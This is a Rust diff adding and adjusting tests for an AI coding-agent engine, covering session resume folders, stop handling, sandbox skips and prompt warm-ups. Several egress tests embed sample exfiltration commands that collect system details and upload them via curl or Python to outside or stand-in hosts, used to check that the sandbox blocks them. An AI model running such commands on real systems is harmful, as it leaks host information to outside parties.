@@ -2386,6 +2386,9 @@ async fn until_idle(h: &mut Handle) -> Vec<Envelope> {
 /// and the session file now belongs to that folder.
 #[tokio::test]
 async fn use_folder_moves_a_chat_into_a_project() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-use-folder-{}", new_id()));
     let (chat, project, store) = (base.join("chat"), base.join("project"), base.join("store"));
     for d in [&chat, &project, &store] {
@@ -2507,6 +2510,9 @@ fn chat_engine(script: Vec<Response>, cwd: PathBuf) -> Handle {
 /// dead session's log still says where it was working; a command that stays put isn't.
 #[tokio::test]
 async fn a_bash_cd_logs_the_shell_cwd() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-shell-cwd-{}", new_id()));
     let (root, store) = (base.join("repo"), base.join("store"));
     let tree = root.join(".frog/worktrees/w");
@@ -2906,6 +2912,9 @@ async fn shutdown(mut h: Handle) {
 /// that call's own result. The next command runs from the root without a notice.
 #[tokio::test]
 async fn removing_its_own_cwd_falls_back_quietly() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-cwd-self-{}", session::new_id()));
     let project = base.join("project");
     std::fs::create_dir_all(project.join("wt")).unwrap();
@@ -2972,6 +2981,9 @@ async fn removing_its_own_cwd_falls_back_quietly() {
 /// request (its relative paths now resolve somewhere else).
 #[tokio::test]
 async fn bash_falls_back_to_the_session_root_when_cwd_is_deleted() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-cwd-gone-{}", session::new_id()));
     let project = base.join("project");
     let gone = project.join("gone");
@@ -3201,6 +3213,108 @@ fn log_turn_started(dir: &std::path::Path, id: &str) -> Result<()> {
         },
     })?;
     Ok(())
+}
+
+/// Options for an engine resuming `resume` from `store`, serving from `cwd`.
+fn resume_opts(store: &Path, resume: &str, cwd: PathBuf) -> Options {
+    let mut profile = Profile::new(ProviderKind::Ollama, "test");
+    profile.tool_mode = ToolMode::Native;
+    Options {
+        cfg: Config {
+            hermetic: true,
+            ..Config::default()
+        },
+        profile_name: "test".into(),
+        profile,
+        cwd,
+        mode: Mode::Default,
+        can_ask: true,
+        resume: Some(resume.into()),
+        store: Some(store.to_path_buf()),
+        sandbox: false,
+        rich: false,
+        subagent: false,
+        chat: false,
+    }
+}
+
+/// Issue #107: an engine restarted in the wrong folder (the main checkout, while the
+/// session's worktree still exists) refuses to serve the session, naming both folders, so its
+/// commands and edits can't land in another tree. From its own folder it resumes as before.
+#[tokio::test]
+async fn a_resume_from_another_folder_refuses_while_the_sessions_folder_exists() {
+    let base = std::env::temp_dir().join(format!("frog-serve-cwd-{}", new_id()));
+    let (tree, checkout, store) = (base.join("tree"), base.join("checkout"), base.join("store"));
+    for d in [&tree, &checkout, &store] {
+        std::fs::create_dir_all(d).unwrap();
+    }
+    let mut h = engine_with(
+        vec![reply(vec![text("hello")], Stop::End)],
+        true,
+        Some(store.clone()),
+        None,
+        None,
+        tree.clone(),
+    );
+    let sid = run(&mut h, "hi").await[0].session.clone();
+    shutdown(h).await;
+
+    let script = || Provider::Scripted(scripted::Client::new(vec![]));
+    let err = match start(resume_opts(&store, &sid, checkout.clone()), script()) {
+        Ok(_) => panic!("an engine in the wrong folder served the session"),
+        Err(e) => format!("{e:#}"),
+    };
+    let real = |p: &Path| p.canonicalize().unwrap().display().to_string();
+    assert!(
+        err.contains(&real(&tree)) && err.contains(&real(&checkout)),
+        "names both folders: {err}"
+    );
+    // Refused before anything opened: the session's own folder resumes it fine.
+    let mut h = start(resume_opts(&store, &sid, tree.clone()), script()).unwrap();
+    until_idle(&mut h).await;
+    shutdown(h).await;
+    let _ = std::fs::remove_dir_all(&base);
+}
+
+/// When the session's folder is gone (a cleaned-up worktree), there's no tree to protect and
+/// refusing would strand its history: it serves from where it was started, and says so once.
+#[tokio::test]
+async fn a_resume_whose_folder_is_gone_serves_here_with_one_warning() {
+    let base = std::env::temp_dir().join(format!("frog-serve-gone-{}", new_id()));
+    let (tree, checkout, store) = (base.join("tree"), base.join("checkout"), base.join("store"));
+    for d in [&tree, &checkout, &store] {
+        std::fs::create_dir_all(d).unwrap();
+    }
+    let mut h = engine_with(
+        vec![reply(vec![text("hello")], Stop::End)],
+        true,
+        Some(store.clone()),
+        None,
+        None,
+        tree.clone(),
+    );
+    let sid = run(&mut h, "hi").await[0].session.clone();
+    shutdown(h).await;
+    std::fs::remove_dir_all(&tree).unwrap();
+
+    let script = Provider::Scripted(scripted::Client::new(vec![]));
+    let mut h = start(resume_opts(&store, &sid, checkout.clone()), script).unwrap();
+    let warned: Vec<String> = until_idle(&mut h)
+        .await
+        .into_iter()
+        .filter_map(|e| match e.event {
+            Event::Notice { message, .. } if message.contains("no longer exists") => Some(message),
+            _ => None,
+        })
+        .collect();
+    assert_eq!(warned.len(), 1, "{warned:?}");
+    assert!(
+        warned[0].contains(&tree.display().to_string()),
+        "{}",
+        warned[0]
+    );
+    shutdown(h).await;
+    let _ = std::fs::remove_dir_all(&base);
 }
 
 #[tokio::test]
@@ -6123,6 +6237,61 @@ async fn clear_inbox_drops_queued_messages_so_a_stop_stays_stopped() {
     shutdown(h).await;
 }
 
+/// Issue #117: a parent's message to an engine-owned child that arrives mid-turn parks for
+/// the turn's next tool-call boundary (see the router's `Op::Deliver` arm). A stop with
+/// `clear_queue` (kids' StopSession sends `ClearInbox` + `Interrupt`) must void it too: the
+/// stand-down a manager sent just before stopping a worker must not restart that worker the
+/// moment its turn ends, which is how a finished worker kept issuing cards after the stop.
+#[tokio::test]
+async fn clear_inbox_drops_a_parked_parent_message_so_a_stop_stays_stopped() {
+    let script = vec![
+        reply(vec![list_sessions_call()], Stop::ToolUse),
+        reply(vec![text("re-issuing the push card")], Stop::End),
+    ];
+    let mut h = engine(script, true);
+    caps(&h, true);
+    while !matches!(h.events.recv().await.unwrap().event, Event::Idle) {}
+    h.ops
+        .send(Op::Submit {
+            text: "work".into(),
+            images: Vec::new(),
+            more: Vec::new(),
+        })
+        .unwrap();
+    let mut evs = Vec::new();
+    let mut cleared = false;
+    loop {
+        let env = h.events.recv().await.unwrap();
+        if let Event::SessionRequest { .. } = &env.event {
+            // Mid-turn: the parent's stand-down parks, then the stop clears the queue.
+            h.ops
+                .send(Op::Deliver {
+                    from: "parent".into(),
+                    from_name: "parent".into(),
+                    message: "stand down".into(),
+                })
+                .unwrap();
+            h.ops.send(Op::ClearInbox).unwrap();
+            h.ops.send(Op::Interrupt).unwrap();
+            cleared = true;
+        }
+        let idle = matches!(env.event, Event::Idle);
+        evs.push(env);
+        if idle && cleared {
+            break;
+        }
+    }
+    let started: Vec<String> = evs
+        .iter()
+        .filter_map(|e| match &e.event {
+            Event::TurnStarted { input, .. } => Some(input.clone()),
+            _ => None,
+        })
+        .collect();
+    assert_eq!(started, ["work"], "a voided parent message started a turn");
+    shutdown(h).await;
+}
+
 #[tokio::test]
 async fn deliver_while_busy_waits_for_the_turn_boundary() {
     let script = vec![
@@ -6927,6 +7096,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn a_workers_upload_to_an_unlisted_host_is_blocked_at_connect() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         let probe = "uname -a > probe.txt && scutil --dns | head -3 >> probe.txt; curl -sS -m 5 -T probe.txt https://oss-cn-beijing.aliyuncs.com/probe/probe.txt; echo rc=$?";
         let py = "python3 -c \"import urllib.request; urllib.request.urlopen('https://exfil.example.net/x?d=1', timeout=5)\" 2>&1 | tail -1; echo rc=$?";
         let (mut h, dir) = egress_engine(
@@ -6975,6 +7147,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn workers_enforce_and_interactive_sessions_keep_the_open_network() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         for worker in [true, false] {
             let (mut h, dir) = egress_engine(
                 vec![
@@ -7003,6 +7178,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn an_explicit_grant_unblocks_one_call_or_adds_the_host() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         let curl = "curl -sS -m 3 -o /dev/null https://pkgs.example.org/x; echo rc=$?";
         let (mut h, dir) = egress_engine(
             vec![
@@ -7199,6 +7377,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn yolo_still_blocks_an_undeclared_host() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         let exfil = "curl -sS -m 5 -o /dev/null https://exfil.example.net/x; echo rc=$?";
         let (mut h, dir) = egress_engine(
             vec![
@@ -7701,6 +7882,9 @@ fn repo_with_worktree(tag: &str) -> (PathBuf, PathBuf) {
 /// worktree even after the shell moved to the main checkout.
 #[tokio::test]
 async fn file_tools_stay_rooted_in_the_session_worktree() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let (main, wt) = repo_with_worktree("root");
     let pwd = Block::ToolUse {
         id: "p".into(),
@@ -7967,6 +8151,9 @@ async fn rewind_restores_files_and_branches_the_conversation() {
 
 #[tokio::test]
 async fn rewind_in_a_git_repo_undoes_shell_commands_too() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let ws = tmp_store();
     let git = |args: &[&str]| {
@@ -9621,6 +9808,9 @@ async fn draining_the_parent_suspends_its_subagent_mid_turn_and_resume_reruns() 
 /// doesn't inline that file into the turn.
 #[tokio::test]
 async fn a_wake_notice_does_not_expand_mentions() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     std::fs::write(dir.join("notes.txt"), "inlined-file-body").unwrap();
     let job = call(
@@ -9649,6 +9839,9 @@ async fn a_wake_notice_does_not_expand_mentions() {
 
 #[tokio::test]
 async fn a_finished_bash_job_reports_its_exit_and_output() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let job = call(
         "b",
@@ -9692,6 +9885,9 @@ async fn a_finished_bash_job_reports_its_exit_and_output() {
 /// ended, so a model working through a long turn reasoned about a stale world.
 #[tokio::test]
 async fn a_wake_landing_mid_turn_reaches_the_next_call_of_that_turn() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     // A monitor that fires 1s in, while the 3s Bash call is still running: the notice is
     // parked before the turn's second step starts, and drops here.
@@ -9945,6 +10141,9 @@ async fn a_second_long_sleep_while_one_waits_is_refused() {
 /// through to the turn's end and ran as the next turn; that is the behaviour this replaces.)
 #[tokio::test]
 async fn wakes_mid_turn_join_that_turn_in_order() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -10080,6 +10279,9 @@ async fn an_informational_message_is_read_without_a_turn() {
 /// wake row, because the wake already landed.
 #[tokio::test]
 async fn a_wake_joins_the_turn_and_a_late_message_opens_the_next() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -10167,6 +10369,9 @@ async fn a_wake_joins_the_turn_and_a_late_message_opens_the_next() {
 /// start a turn of its own; it goes along with the user's next message.
 #[tokio::test]
 async fn a_stop_holds_wakes_for_the_next_turn() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -10234,6 +10439,9 @@ async fn a_stop_holds_wakes_for_the_next_turn() {
 /// Short sleeps and sleeps with real work after them still run inline, as written.
 #[tokio::test]
 async fn a_short_sleep_or_real_work_runs_inline() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -12355,6 +12563,9 @@ async fn second_pass_allows_deleting_the_sessions_own_scratch() {
 /// user even when the second pass (and a chief grant) would have allowed it.
 #[tokio::test]
 async fn rm_rf_outside_scratch_is_never_delegated() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     // Outside the shared temp dir: on Linux the test engine's project root *is*
     // /tmp, so a tree there would count as in-project.
     let dir = crate::approval::normalize(
@@ -13418,6 +13629,9 @@ async fn with_every_node_down_the_turn_ends_with_one_line() {
 /// every change is a durable `Prs` with the whole list (so a replay renders the git line).
 #[tokio::test]
 async fn prs_bind_from_gh_pr_create_and_by_hand() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-prs-{}", new_id()));
     let (root, store) = (base.join("repo"), base.join("store"));
     for d in [&root, &store] {
@@ -14047,4 +14261,307 @@ mod open_pr_tests {
         shutdown(h).await;
         let _ = std::fs::remove_dir_all(&base);
     }
+}
+
+// --- Warm-ups (`Op::Warm`, docs/design/zero-prefill.md) -----------------------------------
+
+/// An engine on a scripted server that prefills: what it was asked to warm, and what it was
+/// sent. With `gate`, warm-ups pend until the test opens it.
+fn engine_warm(
+    script: Vec<Response>,
+    gate: Option<Arc<std::sync::atomic::AtomicBool>>,
+    hold: Option<Arc<(std::sync::atomic::AtomicBool, std::sync::atomic::AtomicBool)>>,
+) -> (
+    Handle,
+    Arc<Mutex<Vec<String>>>,
+    Arc<Mutex<Vec<scripted::Prefilled>>>,
+) {
+    let dir = tmp_store();
+    let mut profile = Profile::new(ProviderKind::Ollama, "test");
+    profile.tool_mode = ToolMode::Native;
+    let opts = Options {
+        cfg: Config {
+            hermetic: true,
+            ..Config::default()
+        },
+        profile_name: "test".into(),
+        profile,
+        cwd: dir.clone(),
+        mode: Mode::AcceptEdits,
+        can_ask: true,
+        resume: None,
+        store: Some(dir),
+        sandbox: false,
+        rich: false,
+        subagent: false,
+        chat: false,
+    };
+    let (mut client, prefills) = scripted::Client::new(script).with_prefill();
+    client.prefill_gate = gate;
+    client.hold = hold;
+    let sent = client.sent.clone();
+    (
+        start(opts, Provider::Scripted(client)).unwrap(),
+        sent,
+        prefills,
+    )
+}
+
+/// Wait (a few seconds at most) until the server has seen `n` warm-ups.
+async fn warmed(
+    prefills: &Arc<Mutex<Vec<scripted::Prefilled>>>,
+    n: usize,
+) -> Vec<scripted::Prefilled> {
+    for _ in 0..1000 {
+        let got = prefills.lock().unwrap().clone();
+        if got.len() >= n {
+            return got;
+        }
+        tokio::time::sleep(Duration::from_millis(5)).await;
+    }
+    panic!("expected {n} warm-ups, got {:?}", prefills.lock().unwrap());
+}
+
+fn warm(h: &Handle, draft: Option<&str>) {
+    h.ops
+        .send(Op::Warm {
+            draft: draft.map(String::from),
+        })
+        .unwrap();
+}
+
+/// The bet itself: what the composer warmed while the user typed is exactly the start of the
+/// request their message sends, so the server prefills nothing it already read. Keyed by the
+/// session, so the server warms this conversation's slot.
+#[tokio::test]
+async fn a_warmed_draft_is_the_prefix_of_the_turn_that_sends_it() {
+    let script = vec![
+        reply(vec![text("hello")], Stop::End),
+        reply(vec![text("fixed")], Stop::End),
+    ];
+    let (mut h, sent, prefills) = engine_warm(script, None, None);
+    let sid = run(&mut h, "hi").await[0].session.clone();
+    warm(&h, Some("fix the bug in parse"));
+    let got = warmed(&prefills, 1).await;
+    assert_eq!(got[0].key.as_deref(), Some(sid.as_str()));
+    assert!(got[0].request.contains("fix the bug in parse"));
+    h.ops
+        .send(Op::Submit {
+            text: "fix the bug in parse".into(),
+            images: Vec::new(),
+            more: Vec::new(),
+        })
+        .unwrap();
+    let calls = calls(&until_idle(&mut h).await);
+    let sent = sent.lock().unwrap().clone();
+    assert_eq!(sent.len(), 2);
+    assert_eq!(
+        sent[1], got[0].request,
+        "the turn sends exactly what was warmed"
+    );
+    // And the call says so (`frog bench` reads it): it only appended to the warm-up.
+    assert_eq!(calls[0].extends, Some(true));
+    shutdown(h).await;
+}
+
+/// Warming before the first message of a session: the system prompt and tools are the
+/// conversation, and the draft is its first message.
+#[tokio::test]
+async fn a_new_sessions_first_message_is_warmed_too() {
+    let script = vec![reply(vec![text("hi")], Stop::End)];
+    let (mut h, sent, prefills) = engine_warm(script, None, None);
+    while !matches!(h.events.recv().await.unwrap().event, Event::Idle) {}
+    // Nothing to warm yet: an empty conversation and no draft.
+    warm(&h, None);
+    warm(&h, Some("what does this repo do"));
+    let got = warmed(&prefills, 1).await;
+    run_no_wait(&mut h, "what does this repo do").await;
+    assert_eq!(
+        prefills.lock().unwrap().len(),
+        1,
+        "the bare warm sent nothing"
+    );
+    assert_eq!(sent.lock().unwrap()[0], got[0].request);
+    shutdown(h).await;
+}
+
+/// Submit and collect through `Idle`, without first waiting for one.
+async fn run_no_wait(h: &mut Handle, prompt: &str) -> Vec<Envelope> {
+    h.ops
+        .send(Op::Submit {
+            text: prompt.into(),
+            images: Vec::new(),
+            more: Vec::new(),
+        })
+        .unwrap();
+    until_idle(h).await
+}
+
+/// Shell output waiting to go along with the next message (`!cmd`) is part of what's warmed,
+/// ahead of the words, as the turn will send it.
+#[tokio::test]
+async fn a_warm_up_carries_pending_shell_output() {
+    let script = vec![
+        reply(vec![text("hello")], Stop::End),
+        reply(vec![text("seen")], Stop::End),
+    ];
+    let (mut h, sent, prefills) = engine_warm(script, None, None);
+    run(&mut h, "hi").await;
+    h.ops
+        .send(Op::Shell {
+            command: "echo pending-output".into(),
+        })
+        .unwrap();
+    until_idle(&mut h).await;
+    warm(&h, Some("why did that print"));
+    let got = warmed(&prefills, 1).await;
+    assert!(got[0].request.contains("pending-output"));
+    run_no_wait(&mut h, "why did that print").await;
+    assert_eq!(sent.lock().unwrap()[1], got[0].request);
+    shutdown(h).await;
+}
+
+/// Typing sends a warm-up after every pause. While one runs, newer drafts replace the one
+/// waiting: the server works on the latest text, never a backlog of stale ones.
+#[tokio::test]
+async fn drafts_typed_during_a_warm_up_coalesce_to_the_latest() {
+    let gate = Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let script = vec![reply(vec![text("hello")], Stop::End)];
+    let (mut h, _sent, prefills) = engine_warm(script, Some(gate.clone()), None);
+    run(&mut h, "hi").await;
+    warm(&h, Some("fix"));
+    warm(&h, Some("fix the"));
+    warm(&h, Some("fix the parser"));
+    // Let the ops land before the first warm-up gets through.
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    gate.store(true, std::sync::atomic::Ordering::SeqCst);
+    let got = warmed(&prefills, 2).await;
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    let got_all = prefills.lock().unwrap().clone();
+    assert_eq!(got_all.len(), 2, "{got_all:?}");
+    assert!(got[0].request.contains("\"fix\""));
+    assert!(got[1].request.contains("fix the parser"));
+    shutdown(h).await;
+}
+
+/// Sending the message makes a draft still waiting to warm stale: the turn's own call warms
+/// the slot, and a late warm-up of an older draft would only rewind it.
+#[tokio::test]
+async fn sending_drops_a_draft_still_waiting_to_warm() {
+    let gate = Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let script = vec![
+        reply(vec![text("hello")], Stop::End),
+        reply(vec![text("done")], Stop::End),
+    ];
+    let (mut h, _sent, prefills) = engine_warm(script, Some(gate.clone()), None);
+    run(&mut h, "hi").await;
+    warm(&h, Some("first draft"));
+    warm(&h, Some("second draft"));
+    run_no_wait(&mut h, "what I sent").await;
+    gate.store(true, std::sync::atomic::Ordering::SeqCst);
+    warmed(&prefills, 1).await;
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    let got = prefills.lock().unwrap().clone();
+    assert_eq!(
+        got.len(),
+        1,
+        "only the warm-up already running went out: {got:?}"
+    );
+    assert!(got[0].request.contains("first draft"));
+    shutdown(h).await;
+}
+
+/// Mid-turn the server is busy with the turn, which leaves the slot warm: a draft typed then
+/// isn't sent (it would queue behind the turn's calls). It goes once the turn is over, on top
+/// of the conversation as the turn left it, since the composer won't send the same text again.
+#[tokio::test]
+async fn a_draft_typed_mid_turn_is_warmed_when_the_turn_ends() {
+    let hold = Arc::new((
+        std::sync::atomic::AtomicBool::new(true),
+        std::sync::atomic::AtomicBool::new(false),
+    ));
+    let script = vec![
+        reply(vec![text("done")], Stop::End),
+        reply(vec![text("next")], Stop::End),
+    ];
+    let (mut h, sent, prefills) = engine_warm(script, None, Some(hold.clone()));
+    while !matches!(h.events.recv().await.unwrap().event, Event::Idle) {}
+    h.ops
+        .send(Op::Submit {
+            text: "go".into(),
+            images: Vec::new(),
+            more: Vec::new(),
+        })
+        .unwrap();
+    while sent.lock().unwrap().is_empty() {
+        tokio::time::sleep(Duration::from_millis(5)).await;
+    }
+    warm(&h, Some("typed while it works"));
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    assert!(
+        prefills.lock().unwrap().is_empty(),
+        "nothing warms mid-turn"
+    );
+    hold.1.store(true, std::sync::atomic::Ordering::SeqCst);
+    until_idle(&mut h).await;
+    let got = warmed(&prefills, 1).await;
+    assert!(got[0].request.contains("typed while it works"));
+    assert!(
+        got[0].request.contains("done"),
+        "warmed after the turn's reply"
+    );
+    run_no_wait(&mut h, "typed while it works").await;
+    assert_eq!(sent.lock().unwrap()[1], got[0].request);
+    shutdown(h).await;
+}
+
+/// A message sent while the turn runs supersedes the draft typed before it: that draft is
+/// never warmed (it would rewind the slot the follow-up's turn just filled).
+#[tokio::test]
+async fn a_message_sent_mid_turn_makes_the_held_draft_stale() {
+    let hold = Arc::new((
+        std::sync::atomic::AtomicBool::new(true),
+        std::sync::atomic::AtomicBool::new(false),
+    ));
+    let script = vec![
+        reply(vec![text("done")], Stop::End),
+        reply(vec![text("next")], Stop::End),
+    ];
+    let (mut h, sent, prefills) = engine_warm(script, None, Some(hold.clone()));
+    while !matches!(h.events.recv().await.unwrap().event, Event::Idle) {}
+    h.ops
+        .send(Op::Submit {
+            text: "go".into(),
+            images: Vec::new(),
+            more: Vec::new(),
+        })
+        .unwrap();
+    while sent.lock().unwrap().is_empty() {
+        tokio::time::sleep(Duration::from_millis(5)).await;
+    }
+    warm(&h, Some("half a thought"));
+    h.ops
+        .send(Op::Submit {
+            text: "the whole thought".into(),
+            images: Vec::new(),
+            more: Vec::new(),
+        })
+        .unwrap();
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    hold.1.store(true, std::sync::atomic::Ordering::SeqCst);
+    while sent.lock().unwrap().len() < 2 {
+        tokio::time::sleep(Duration::from_millis(5)).await;
+    }
+    until_idle(&mut h).await;
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    assert!(
+        prefills
+            .lock()
+            .unwrap()
+            .iter()
+            .all(|p| !p.request.contains("half a thought")),
+        "{:?}",
+        prefills.lock().unwrap()
+    );
+    shutdown(h).await;
 }
